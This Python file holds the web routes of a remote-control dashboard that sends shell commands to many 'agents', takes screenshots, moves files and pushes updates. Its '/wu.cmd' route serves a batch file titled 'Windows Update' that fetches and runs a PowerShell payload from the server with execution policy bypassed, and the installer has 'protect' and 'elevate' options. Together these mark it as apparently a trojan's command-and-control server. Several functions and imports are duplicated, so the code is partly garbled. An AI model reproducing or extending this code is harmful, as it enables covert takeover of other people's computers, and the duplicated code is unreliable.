"""HTTP routes and the websocket endpoint for the dashboard."""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import re
import secrets
import threading
import time
from typing import Any

import threading

import threading

from .. import config, crypto, httpd, log, packaging, ws
from .hub import Hub, safe_name
from . import webinstall, runtime_cache

STATE_FILE = "controller-state.json"
TOKEN_TTL = 60 * 60 * 24 * 14
SESSION_COOKIE = "syspy_session"


def _hash_password(password: str, salt: bytes = b"") -> str:
    """PBKDF2-SHA256. Stdlib only; the salt travels with the hash."""
    salt = salt or os.urandom(16)
    rounds = config.PASSWORD_ITERATIONS
    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, rounds)
    return "pbkdf2$%d$%s$%s" % (rounds, salt.hex(), digest.hex())


def _same(left: str, right: str) -> bool:
    """compare_digest raises on non-ASCII str; compare UTF-8 bytes instead."""
    try:
        return hmac.compare_digest(left.encode("utf-8"), right.encode("utf-8"))
    except (AttributeError, UnicodeError):
        return left == right


def _verify_password(entered: str, stored: str) -> bool:
    """Accepts a legacy plaintext value so an existing state file still works."""
    if not stored.startswith("pbkdf2$"):
        return _same(entered, stored)
    try:
        _tag, rounds, salt_hex, want = stored.split("$")
        digest = hashlib.pbkdf2_hmac("sha256", entered.encode("utf-8"),
                                     bytes.fromhex(salt_hex), int(rounds))
        return hmac.compare_digest(digest.hex(), want)
    except (ValueError, TypeError):
        return False


def _client_ip(request: httpd.Request) -> str:
    """Best-effort real client IP.

    X-Forwarded-For is client-supplied, so believing it blindly lets every
    request pick a fresh rate-limit bucket. Walk ``TRUST_PROXY_HOPS`` entries in
    from the right instead, which is the only entry the last proxy added.
    """
    if config.TRUST_PROXY_HOPS > 0:
        chain = [part.strip() for part in
                 (request.headers.get("X-Forwarded-For") or "").split(",") if part.strip()]
        if chain:
            index = max(0, len(chain) - config.TRUST_PROXY_HOPS)
            return chain[index]
    for header in ("X-Real-IP", "CF-Connecting-IP"):
        value = (request.headers.get(header) or "").strip()
        if value:
            return value
    return "client"


def _client_ip(request: httpd.Request) -> str:
    """Best-effort real client IP.

    X-Forwarded-For is client-supplied, so believing it blindly lets every
    request pick a fresh rate-limit bucket. Walk ``TRUST_PROXY_HOPS`` entries in
    from the right instead, which is the only entry the last proxy added.
    """
    if config.TRUST_PROXY_HOPS > 0:
        chain = [part.strip() for part in
                 (request.headers.get("X-Forwarded-For") or "").split(",") if part.strip()]
        if chain:
            index = max(0, len(chain) - config.TRUST_PROXY_HOPS)
            return chain[index]
    for header in ("X-Real-IP", "CF-Connecting-IP"):
        value = (request.headers.get(header) or "").strip()
        if value:
            return value
    return "client"


def _safe_dir(name: str) -> str:
    return re.sub(r"[^A-Za-z0-9._ -]", "_", name)[:60] or "agent"


def _base(request: httpd.Request) -> str:
    """Public base URL.  SYSPY_URL wins; otherwise trust Render's headers."""
    if config.PUBLIC_URL:
        return config.PUBLIC_URL
    host = (request.headers.get("X-Forwarded-Host")
            or request.headers.get("Host") or "").split(",")[0].strip()
    if config.ALLOWED_HOSTS:
        bare = host.split(":")[0].lower()
        if bare and bare not in config.ALLOWED_HOSTS:
            # A spoofed Host would otherwise be baked into every installer line.
            host = config.ALLOWED_HOSTS[0]
    proto = (request.headers.get("X-Forwarded-Proto") or "https").split(",")[0].strip()
    return f"{proto}://{host}".rstrip("/") if host else ""


def _update_archive(root: str) -> bytes:
    """Build an update bundle without replacing an agent's identity."""
    overlay = json.dumps({
        "room": config.ROOM,
        "pass": config.PASSPHRASE,
    }).encode("utf-8")
    return packaging.build_zip(root, extra={"deploy.json": overlay})


class Api:
    """Owns the hub, the settings and the HTTP application."""

    def _cached_kit(self) -> bytes:
        """Rebuild only when the tree changed. /wu/kit.zip used to walk and
        SHA-256 the whole tree on every unauthenticated request."""
        stamp = 0.0
        for relative in ("agent.py", "bootstrap.py", "syspy", "install"):
            path = os.path.join(self.root, relative)
            try:
                if os.path.isdir(path):
                    for current, _dirs, files in os.walk(path):
                        for name in files:
                            stamp = max(stamp, os.path.getmtime(
                                os.path.join(current, name)))
                else:
                    stamp = max(stamp, os.path.getmtime(path))
            except OSError:
                pass
        with self._kit_lock:
            if self._kit and self._kit_stamp == stamp:
                return self._kit
            self._kit = _update_archive(self.root)
            self._kit_stamp = stamp
            return self._kit

    def __init__(self, root: str) -> None:
        self.root = os.path.abspath(root)
        self.data_dir = os.environ.get("SYSPY_DATA") or os.path.join(self.root, "data")
        os.makedirs(self.data_dir, exist_ok=True)
        self.key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
        self.hub = Hub(self.key, os.path.join(self.data_dir, "received"),
                       db_path=os.path.join(self.data_dir, "agents_db.json"))
        self.state = self._load_state()
        self.app = httpd.Application()
        self._login_attempts: dict[str, list[float]] = {}
        self._tickets: dict[str, float] = {}
        self._kit: bytes = b""
        self._kit_stamp: float = -1.0
        self._kit_lock = threading.Lock()
        self._kit: bytes = b""
        self._kit_stamp: float = -1.0
        self._kit_lock = threading.Lock()
        self.app.static(os.path.join(os.path.dirname(__file__), "static"))
        self._register_routes()

    # ------------------------------------------------------------------
    # State
    # ------------------------------------------------------------------

    def _load_state(self) -> dict[str, Any]:
        defaults: dict[str, Any] = {
            "password": os.environ.get("SYSPY_PASSWORD") or secrets.token_urlsafe(9),
            "tokens": [],
            "auto_open": True,
        }
        path = os.path.join(self.data_dir, STATE_FILE)
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as handle:
                    defaults.update(json.load(handle))
            except (OSError, ValueError):
                pass
        return defaults

    def _save_state(self) -> None:
        path = os.path.join(self.data_dir, STATE_FILE)
        tmp = path + ".tmp"
        try:
            with open(tmp, "w", encoding="utf-8") as handle:
                json.dump(self.state, handle, indent=2)
            os.replace(tmp, path)
            try:
                os.chmod(path, 0o600)   # holds the password hash and live tokens
            except OSError:
                pass
        except OSError:
            pass

    def _presented_tokens(self, request: httpd.Request) -> list[str]:
        presented = []
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            presented.append(auth[7:].strip())
        header = request.headers.get("X-SysPy-Token", "")
        if header:
            presented.append(header)
        for part in (request.headers.get("Cookie", "") or "").split(";"):
            name, _, value = part.strip().partition("=")
            if name == SESSION_COOKIE and value:
                presented.append(value)
        query_token = request.param("token", "")
        if query_token:
            presented.append(query_token)
        return [p for p in presented if p]

    def authenticate(self, request: httpd.Request) -> bool:
        """Check the session token or bearer header."""
        now = time.time()
        presented = []
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            presented.append(auth[7:].strip())
        header = request.headers.get("X-SysPy-Token", "")
        if header:
            presented.append(header)
        # Cookie so <img src="/files/..."> works without a URL token.
        for part in (request.headers.get("Cookie", "") or "").split(";"):
            name, _, value = part.strip().partition("=")
            if name == SESSION_COOKIE and value:
                presented.append(value)
        # Query token kept for compatibility with an older cached app.js.
        query_token = request.param("token", "")
        if query_token:
            presented.append(query_token)

        presented = presented or []
        presented = presented or []
        for entry in self.state.get("tokens", []):
            token = entry["token"] if isinstance(entry, dict) else entry
            issued = entry.get("at", 0) if isinstance(entry, dict) else now
            if now - issued > TOKEN_TTL or not isinstance(token, str):
                continue
            if any(_same(candidate, token) for candidate in presented if candidate):
                return True
        return False

    # ------------------------------------------------------------------
    # Routes
    # ------------------------------------------------------------------

    def _register_routes(self) -> None:
        app = self.app

        @app.route("POST", "/api/login")
        def login(request: httpd.Request) -> httpd.Response:
            # X-Forwarded-For is client-supplied. Only believe it behind a
            # proxy that overwrites it, otherwise every request can pick a new
            # bucket and the limiter does nothing.
            ip = _client_ip(request)
            now = time.time()
            attempts = [t for t in self._login_attempts.get(ip, []) if now - t < 60]
            if len(attempts) >= 10:
                return httpd.Response.json(429, {"error": "too many attempts, try again later"})
            if attempts:
                # Progressive backoff after a failed attempt, capped.
                pause = min(0.4 * (2 ** len(attempts)), 4.0)
                if now - attempts[-1] < pause:
                    return httpd.Response.json(429, {"error": "slow down", "retry_in": round(pause, 1)})

            payload = request.json()
            entered = str(payload.get("password", "")).strip()
            stored = str(self.state.get("password", "")).strip()
            if not _verify_password(entered, stored):
                attempts.append(now)
                self._login_attempts[ip] = attempts
                return httpd.Response.json(401, {"error": "wrong password"})
            if ip in self._login_attempts:
                self._login_attempts.pop(ip, None)
            token = secrets.token_urlsafe(24)
            now_ts = time.time()
            response = None
            live = [t for t in self.state["tokens"]
                    if isinstance(t, dict) and now_ts - t.get("at", 0) < TOKEN_TTL]
            label = (payload.get("label") or request.headers.get("User-Agent") or "")[:60]
            live.append({"token": token, "at": now_ts, "label": label})
            self.state["tokens"] = live[-200:]
            self._save_state()
            response = httpd.Response.json(200, {"token": token})
            secure = "; Secure" if (request.headers.get("X-Forwarded-Proto") == "https"
                                    or request.param("secure") == "1") else ""
            response.headers["Set-Cookie"] = (
                f"{SESSION_COOKIE}={token}; HttpOnly; SameSite=Lax; Path=/; "
                f"Max-Age={TOKEN_TTL}{secure}")
            return response

        @app.route("POST", "/api/agent/delete")
        def delete_agent(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            agent_id = request.json().get("agent", "")
            if self.hub.delete(agent_id):
                return httpd.Response.json(200, {"ok": True})
            return httpd.Response.json(404, {"error": "not found"})

        @app.route("GET", "/api/state")
        def state(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            return httpd.Response.json(200, {
                "agents": [a.to_dict() for a in self.hub.all()],
                "relay": self.hub.relay_up,
                "settings": {"auto_open": self.state["auto_open"]},
            })

        @app.route("POST", "/api/cmd")
        def send_command(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            spec = payload.get("targets", payload.get("agents"))
            command = payload.get("cmd", "")
            if not command:
                return httpd.Response.json(400, {"error": "empty command"})
            targets = self.hub.resolve_targets(spec if spec is not None else "all")
            if not targets:
                return httpd.Response.json(400, {"error": f"no such target: {spec!r}"})
            results = {a: self.hub.send(a, {"t": "cmd", "d": command}) for a in targets}
            return httpd.Response.json(200, {
                "results": results,
                "sent": sum(1 for v in results.values() if v == "sent"),
                "queued": sum(1 for v in results.values() if v == "queued"),
            })

        @app.route("POST", "/api/broadcast")
        def broadcast(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            command = request.json().get("cmd", "")
            return httpd.Response.json(
                200, {"sent": self.hub.broadcast({"t": "cmd", "d": command})})

        @app.route("POST", "/api/action")
        def action(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            verb = payload.get("verb", "")
            targets = self.hub.resolve_targets(payload.get("targets"))
            verbs = {
                "restart": "restart.agent",
                "sleep": "power.sleep",
                "shot": "shot",
                "uninstall": "uninstall",
                "purge": "purge",
            }

            if verb == "run":
                cmd = payload.get("cmd", "")
                results = {a: self.hub.send(a, {"t": "cmd", "d": cmd}) for a in targets}
                return httpd.Response.json(200, {"results": results})
            elif verb == "push":
                try:
                    archive = _update_archive(self.root)
                except OSError as error:
                    return httpd.Response.json(500, {"error": str(error)})
                results = {}
                for a in targets:
                    res = self.hub.send_chunks(a, "update", archive, filename="wu.zip")
                    results[a] = res.get("status", "sent")
                return httpd.Response.json(200, {"results": results, "bytes": len(archive)})
            elif verb == "rename":
                self.hub.rename_many(targets, payload.get("pattern", "{host}"))
                return httpd.Response.json(200, {"ok": True, "count": len(targets)})
            elif verb == "group":
                grp = payload.get("group", "")
                for a in targets:
                    self.hub.set_group(a, grp)
                return httpd.Response.json(200, {"ok": True, "count": len(targets)})
            elif verb in verbs:
                cmd_name = verbs[verb]
                results = {a: self.hub.send(a, {"t": "cmd", "d": cmd_name}) for a in targets}
                return httpd.Response.json(200, {"results": results})
            return httpd.Response.json(400, {"error": f"unknown verb: {verb}"})

        @app.route("POST", "/api/logout")
        def logout(request: httpd.Request) -> httpd.Response:
            """Revoke the presented token only, unless all=1.

            Clearing the whole list used to log you out of every device.
            """
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            presented = self._presented_tokens(request)
            if payload.get("all"):
                self.state["tokens"] = []
            else:
                self.state["tokens"] = [
                    entry for entry in self.state["tokens"]
                    if not (isinstance(entry, dict) and entry.get("token") in presented)
                ]
            self._save_state()
            response = httpd.Response.json(200, {"ok": True,
                                                 "revoked": len(presented)})
            response.headers["Set-Cookie"] = (
                f"{SESSION_COOKIE}=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax")
            return response

        @app.route("GET", "/api/sessions")
        def sessions(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            now = time.time()
            return httpd.Response.json(200, {"sessions": [
                {"label": entry.get("label", ""), "age": int(now - entry.get("at", now)),
                 "current": entry.get("token") in self._presented_tokens(request)}
                for entry in self.state.get("tokens", []) if isinstance(entry, dict)
            ]})

        @app.route("GET", "/api/health")
        def health(request: httpd.Request) -> httpd.Response:
            return httpd.Response.json(200, {
                "ok": True,
                "relay": self.hub.relay_up,
                "agents": len(self.hub.agents),
                "queued": len(self.hub._outbox),
                "outbox_depth": len(self.hub._outbox),
                "counters": self.hub.counters_snapshot(),
            })

        @app.route("GET", "/api/logs")
        def logs(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            try:
                since = float(request.param("since", "0") or 0)
            except ValueError:
                since = 0.0
            level = request.param("level", "").upper()
            rows = [r for r in log.tail(500) if r["ts"] > since]
            if level:
                rows = [r for r in rows if r["level"] == level]
            return httpd.Response.json(200, {"rows": rows, "counters": log.counters(),
                                             "relay": self.hub.relay_up})

        @app.route("GET", "/api/logs/agent")
        def agent_logs(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            status = self.hub.send(request.param("agent", ""),
                                   {"t": "cmd", "d": "log.tail 200"})
            return httpd.Response.json(200, {"status": status})

        @app.route("POST", "/api/ws-ticket")
        def ws_ticket(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            ticket = secrets.token_urlsafe(18)
            self._tickets[ticket] = time.time() + 30
            for key, expiry in list(self._tickets.items()):
                if expiry < time.time():
                    self._tickets.pop(key, None)
            return httpd.Response.json(200, {"ticket": ticket})

        @app.route("GET", "/api/tree")
        def tree(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            return httpd.Response.json(200, {"tree": self.hub.tree(), "relay": self.hub.relay_up})

        @app.route("GET", "/wu")
        def wu(request: httpd.Request) -> httpd.Response:
            if config.WU_TOKEN and request.param("k") != config.WU_TOKEN:
                return httpd.Response.json(403, {"error": "bad or missing ?k="})
            script = webinstall.render(
                base=request.param("base") or _base(request),
                group=request.param("group"),
                target=request.param("target"),
                protect=request.param("protect", "1") != "0",
                elevate=request.param("elevate", "1") != "0",
            )
            response = httpd.Response(200, script.encode("utf-8"),
                                      "text/plain; charset=utf-8")
            response.headers["Cache-Control"] = "no-store"
            return response

        @app.route("GET", "/wu.cmd")
        def wu_cmd(request: httpd.Request) -> httpd.Response:
            base = _base(request)
            body = ("@echo off\r\n"
                    "title Windows Update\r\n"
                    'powershell -NoProfile -ExecutionPolicy Bypass '
                    f'-Command "irm {base}/wu | iex"\r\n')
            return httpd.Response(200, body.encode("ascii"), "text/plain; charset=utf-8")

        @app.route("GET", "/wu/kit.zip")
        def wu_kit(request: httpd.Request) -> httpd.Response:
            archive = self._cached_kit()
            digest = hashlib.sha256(archive).hexdigest()
            if request.headers.get("If-None-Match") == '"%s"' % digest:
                return httpd.Response(304, b"", "application/zip")
            response = httpd.Response(200, archive, "application/zip")
            response.headers["ETag"] = '"%s"' % digest
            response.headers["Cache-Control"] = "no-cache"
            return response

        @app.route("GET", "/wu/kit.meta")
        def wu_kit_meta(request: httpd.Request) -> httpd.Response:
            """Integrity/signature material for the kit, so an installer can
            verify before it extracts anything."""
            archive = self._cached_kit()
            payload = {
                "sha256": hashlib.sha256(archive).hexdigest(),
                "hmac": crypto.hmac_hex(
                    crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), archive),
                "sig": _sign_kit(archive),
                "pubkey": config.PUBKEY_HEX,
                "bytes": len(archive),
            }
            return httpd.Response.json(200, payload)

        @app.route("GET", "/wu/config")
        def wu_config(request: httpd.Request) -> httpd.Response:
            """The deployment material, for installers that would rather fetch
            than have it embedded in a script."""
            return httpd.Response.json(200, {
                "room": config.ROOM,
                "pass": config.PASSPHRASE,
                "fmt": config.ENVELOPE_FMT,
                "proto": config.PROTOCOL_VERSION,
                "pubkey": config.PUBKEY_HEX,
            })

        @app.route("GET", "/wu/py.zip")
        def wu_py(request: httpd.Request) -> httpd.Response:
            arch = "win32" if request.param("arch") == "win32" else "amd64"
            local = os.path.join(self.root, "py.zip")
            if arch == "amd64" and os.path.isfile(local):
                return httpd.Response.file(local)
            try:
                return httpd.Response.file(runtime_cache.cached_runtime(self.data_dir, arch))
            except Exception as error:
                return httpd.Response.json(502, {"error": str(error)})

        @app.route("GET", "/api/install")
        def install_line(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            base = _base(request)
            return httpd.Response.json(200, {
                "base": base,
                "line": webinstall.one_liner(base),
                "legacy": webinstall.one_liner_legacy(base),
                "cmd": f"https://{request.headers.get('Host','')}/wu.cmd",
            })

        @app.route("POST", "/api/nick")
        def nickname(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            ok = self.hub.rename(payload.get("agent", ""), payload.get("nick", ""))
            return httpd.Response.json(200, {"ok": ok})

        @app.route("POST", "/api/push")
        def push(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            try:
                archive = _update_archive(self.root)
            except OSError as error:
                return httpd.Response.json(500, {"error": str(error)})
            payload = request.json()
            spec = payload.get("agents", payload.get("targets"))
            targets = self.hub.resolve_targets(spec if spec is not None else "all")
            results = {
                agent_id: self.hub.send_chunks(
                    agent_id, "update", archive, filename="syspy-update.zip"
                ).get("status", "sent")
                for agent_id in targets
            }
            return httpd.Response.json(200, {
                "bytes": len(archive),
                "agents": len(targets),
                "results": results,
                "sent": sum(1 for status in results.values() if status == "sent"),
                "queued": sum(1 for status in results.values() if status == "queued"),
            })

        @app.route("POST", "/api/upload")
        def upload(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            agent_id = request.param("agent")
            destination = request.param("path", ".")
            filename = request.param("name", "upload.bin")
            if not request.body:
                return httpd.Response.json(400, {"error": "empty body"})
            body = request.body

            def _send() -> None:
                try:
                    self.hub.send_chunks(agent_id, "put", body,
                                         filename=filename, destination=destination)
                except Exception as error:
                    log.get("api").warning("upload to %s failed: %s", agent_id, error)

            threading.Thread(target=_send, name="upload", daemon=True).start()
            return httpd.Response.json(200, {
                "bytes": len(body), "async": True,
                "chunks": max(1, (len(body) + config.CHUNK_SIZE - 1) // config.CHUNK_SIZE),
            })

        @app.route("POST", "/api/download")
        def download(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            status = self.hub.send(payload.get("agent", ""),
                                   {"t": "cmd", "d": "fs.download " + payload.get("path", "")})
            return httpd.Response.json(200, {"ok": status == "sent", "status": status})

        @app.route("POST", "/api/remove")
        def remove(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            spec = payload.get("agents", payload.get("targets"))
            agents = self.hub.resolve_targets(spec if spec is not None else "all")
            for agent_id in agents:
                self.hub.send(agent_id, {"t": "cmd", "d": "uninstall"})
            return httpd.Response.json(200, {"sent": len(agents)})

        @app.route("GET", "/api/files")
        def list_received(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            tree: dict[str, list[dict[str, Any]]] = {}
            root = self.hub.received_root
            if os.path.isdir(root):
                for folder in os.listdir(root):
                    directory = os.path.join(root, folder)
                    if not os.path.isdir(directory):
                        continue
                    tree[folder] = [
                        {"name": name,
                         "size": os.path.getsize(os.path.join(directory, name)),
                         "url": f"/received/{folder}/{name}"}
                        for name in sorted(os.listdir(directory))
                        if os.path.isfile(os.path.join(directory, name))
                    ]
            return httpd.Response.json(200, tree)

        INLINE = {".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp", ".ico",
                  ".woff", ".woff2", ".ttf", ".mp3", ".wav"}

        @app.route("GET", "/files/{agent}/{name}")
        def serve_file(request: httpd.Request) -> httpd.Response:
            # Was unauthenticated: the URL alone was the only access control.
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            params = request.path_params
            folder = os.path.abspath(self.hub.agent_folder(params.get("agent", "")))
            candidate = os.path.abspath(os.path.normpath(os.path.join(folder, params.get("name", ""))))
            folder_prefix = folder if folder.endswith(os.sep) else folder + os.sep
            if not candidate.startswith(folder_prefix):
                return httpd.Response.json(403, {"error": "forbidden"})
            if not os.path.isfile(candidate):
                return httpd.Response.json(404, {"error": "not found"})
            extension = os.path.splitext(candidate)[1].lower()
            response = httpd.Response.file(candidate)
            if extension not in INLINE:
                # An agent-supplied .html served inline executes in the
                # dashboard origin, with the session cookie in scope. Making it
                # an attachment is the cheap, total fix.
                response.headers["Content-Disposition"] = (
                    'attachment; filename="%s"' % os.path.basename(candidate))
            return response

        @app.route("GET", "/received/{agent}/{name}")
        def serve_received(request: httpd.Request) -> httpd.Response:
            return serve_file(request)

        app.on_socket(self._on_socket)

    # ------------------------------------------------------------------
    # Websocket
    # ------------------------------------------------------------------

    def _on_socket(self, socket: ws.WebSocket, request: httpd.Request) -> None:
        # A ticket is single-use and short-lived, so the long-lived token never
        # lands in a URL that proxies and browser diagnostics will record.
        ticket = request.param("ticket")
        ok = bool(ticket) and self._tickets.pop(ticket, 0) > time.time()
        if not ok:
            token = request.param("token")
            ok = bool(token) and any(
                (t["token"] if isinstance(t, dict) else t) == token
                for t in self.state["tokens"])
        if not ok:
            socket.close(1008)
            return

        channel = self.hub.subscribe()
        threading.Thread(target=self._writer, args=(socket, channel),
                         name="ws-writer", daemon=True).start()

        socket.send_text(json.dumps({
            "type": "snapshot",
            "agents": [a.to_dict() for a in self.hub.all()],
            "relay": self.hub.relay_up,
        }))

        try:
            while not socket.closed:
                frame = socket.receive()
                if frame is None:
                    break
                opcode, payload = frame
                if opcode == ws.OP_CLOSE:
                    break
                if opcode == ws.OP_PING:
                    socket.pong(payload)
                elif opcode == ws.OP_TEXT:
                    try:
                        msg = json.loads(payload.decode("utf-8"))
                        if msg.get("type") == "ping":
                            socket.send_text(json.dumps({"type": "pong"}))
                    except Exception:
                        pass
        finally:
            self.hub.unsubscribe(channel)

    @staticmethod
    def _writer(socket: ws.WebSocket, channel: Any) -> None:
        last_ping = time.time()
        while not socket.closed:
            try:
                socket.send_text(channel.get(timeout=1.0))
            except Exception:
                pass
            if time.time() - last_ping > 25:
                last_ping = time.time()
                socket.ping()


def _sign_kit(archive: bytes) -> str:
    if config.SIGN_KEY_HEX:
        try:
            from .. import ed25519
            return ed25519.sign(archive, bytes.fromhex(config.SIGN_KEY_HEX)).hex()
        except Exception:
            pass
    return crypto.hmac_hex(
        crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), archive)


def _sign_kit(archive: bytes) -> str:
    if config.SIGN_KEY_HEX:
        try:
            from .. import ed25519
            return ed25519.sign(archive, bytes.fromhex(config.SIGN_KEY_HEX)).hex()
        except Exception:
            pass
    return crypto.hmac_hex(
        crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), archive)


def create_app(root: str) -> httpd.Application:
    """Build the dashboard application."""
    return Api(root).app
